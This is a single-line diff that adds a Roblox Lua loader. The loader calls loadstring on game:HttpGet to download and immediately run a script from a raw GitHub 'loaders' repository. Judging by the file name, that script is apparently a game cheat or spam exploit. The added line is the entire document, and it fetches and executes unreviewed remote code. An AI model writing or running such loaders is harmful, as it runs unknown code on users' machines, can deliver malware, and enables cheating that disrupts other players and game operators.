@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/ragdoll-reality-spam7-mc33mkrsmk70sv.lua"))()
